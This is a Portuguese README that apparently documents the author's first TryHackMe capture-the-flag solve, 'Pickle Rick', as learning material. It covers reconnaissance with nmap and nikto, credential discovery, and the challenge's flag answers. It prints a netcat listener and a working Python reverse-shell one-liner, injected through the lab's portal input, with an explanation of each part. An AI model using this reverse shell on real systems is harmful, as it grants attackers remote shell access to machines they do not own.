# CTF Pickle Rick - Passo a passo do meu primeiro CTF do TryHackme
Introdução
Este repositório documenta passo a passo a minha jornada de resolução do CTF "Pickle Rick" na plataforma TryHackme. O objetivo é compartilhar meu aprendizado e experiência, detalhando os processos e comandos utilizados para completar o desafio.

## Descrição do Desafio
O objetivo do CTF era encontrar três "ingredientes" para ajudar Rick a se transformar em humano novamente. Para isso, era necessário explorar o site alvo, identificar vulnerabilidades e explorar o sistema para obter acesso aos ingredientes.

## Passos para Resolução
1. **Validação e Verificação do HTML:**
   Inspecionei o código HTML da página inicial e encontrei um comentário com o username "R1ckRul3s".
   No arquivo "/robots.txt", encontrei a palavra "Wubbalubbadubdub".

2. **Scan de Portas com Nmap:**
   Realizei um scan de portas com o comando nmap -sC -sV -oN nmap/initial 10.10.134.39.
   As portas 22 (SSH) e 80 (HTTP) estavam abertas.


3. **Scan de Vulnerabilidades com Nikto:**
   Executei o comando nikto -h http://$IP | tee nkto.log para identificar vulnerabilidades no site.
   Encontrei algumas vulnerabilidades, incluindo:
   * Ausência do cabeçalho X-Frame-Options
   * Versão desatualizada do Apache
   * Cookie PHPSESSID sem o flag httponly
   * Página de login de administrador
  
4. **Primeira Flag:**
   Acessei a página de login /login.php com o username "R1ckRul3s" e a senha "Wubbalubbadubdub".
   Obtive acesso à página de administrador e encontrei a primeira flag no arquivo "Sup3rS3cretPickl3Ingred.txt": "mr. meeseek hair".

5. **Segunda Flag:**
   Decifrei um hash em base64 encontrado no HTML da página, que me levou à frase "rabbit hole" que era só um atrativo para perder tempo. Explorei o código fonte da página /portal.php e executei um reverse shell Python para obter acesso ao servidor no campo de input da mesma. Encontrei a segunda flag no arquivo second ingredients, localizado em /home/rick: "1 jerry tear".

6. **Terceira Flag:**
   Obtive acesso root ao servidor, pois não havia senha definida.
   Encontrei a terceira flag no arquivo 3rd.txt, localizado no diretório raiz: "fleeb juice".
   
## Detalhes Técnicos

### Comando utilizados:
* `nmap -sC -sV -oN nmap/initial $IP`
* `nikto -h http://$IP | tee nkto.log`
* `nc -lnvp 9999`
* ```python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("MeuIP",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'```

### Detalhamento dos comandos utilizados:

**Detalhamento do comando usado no Nmap:**
* **nmap**: Comando utilizado para chamar a ferramente no terminal.
* **-sC**: Opção que permite scripts serem executados na varredura. Existe uma coleção de scripts mais detalhados, mas deixando em branco foi utilizado script default.
* **-sV**: Opção que ativa a detecção de versão dos serviços, tentando detalhar a versão dos softwares e serviços que estão sendo executados no alvo. 
* **-oN nmap/initial**: Esta opção tem como objetivos salvar o retorno da varredura em um arquivo legível salvo no diretório apontado.
* **$IP**: Este é o IP do alvo, definido no terminal atravé do comando `export IP="IP do alvo"` sendo este utilizado para poder ser feita a varredura. 
  
<hr>

**Detalhamento do comando usado no Nitko:**
* **nikto**: Comando utilizado para chamar a ferramente no terminal.
* **-h http://$IP**: A opção `-h` é utilizada para especificar o host que será escaneado. Sendo o host representado pela variável `IP` que havia sido declarada anteriormente no terminal através do comando `export IP="IP do alvo"`.
* **|**: O Pipe serve para pegar o retorno do comando a esquerda dele e usar como entrada para o comando a direita dele.
* **tee nkto.log**: Utilizando o comando tee é possível gravar a saída do comando em um arquivo chamado nkto.log e ainda exibí-la no terminal. 

<hr>

**Detalhamento do comando usado no Ncat:**
* **nc**: Comando utilizado para chamar a ferramenta do terminal e executá-la. 
* **-l**: Opção usada para especificar para o ncat que ele deve ficar "escutando" uma conexão de entrada.
* **-n**: Opção usada para impedir que o ncat realize qualquer pesquisa DNS ou portas, nomes de hosts...
* **-v**: Opção utilizada para aumentar a verbosidade do retorno do ncat, informando mais dados na saída do terminal. 
* **-p 9999**: A opção `-p` é usada para especificar a porta que o ncat deve ficar escutando, e o `9999` é a porta em questão.

<hr>

**Detalhamento do código em Python utilizado:**
* **python3 -c**: Executa o código Python que segue na linha de comando.
* **import socket,subprocess,os**: importa os módulos necessários. O socket para conexões de rede, subprocess para criar novos processos e os para interfaces diversas do sistema operacional.
* **s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);**:Isso cria um novo objeto de socket que usa a família de endereços IPv4 (AF_INET) e o tipo de socket TCP (SOCK_STREAM).
* **s.connect(("Meu IP",9999));**: Isso conecta o socket ao endereço IP informado na porta 9999.
* **os.dup2(s.fileno(),0), os.dup2(s.fileno(),1), os.dup2(s.fileno(),2);**: Essas linhas redirecionam os descritores de arquivo padrão para o socket. 0, 1 e 2 representam os descritores de arquivo padrão para entrada padrão, saída padrão e erro padrão, respectivamente. Isso significa que a entrada, saída e erro do processo que será criado serão enviados através do socket.
* **p=subprocess.call(["/bin/sh","-i"]);**: Isso cria um novo processo que inicia uma nova shell. A opção `-i` garante que a shell seja interativa, o que significa que ela pode receber entrada do usuário.


### Recursos Adicionais:
https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

## Considerações finais

Este CTF foi uma experiência desafiadora e gratificante que me permitiu praticar minhas habilidades em ethical hacking. Através da análise de código, exploração de vulnerabilidades e pivotamento de rede, fui capaz de completar o desafio e obter as três flags.

Agradecimentos:

Agradeço à plataforma TryHackme por oferecer este CTF e por contribuir para o meu aprendizado em segurança da informação.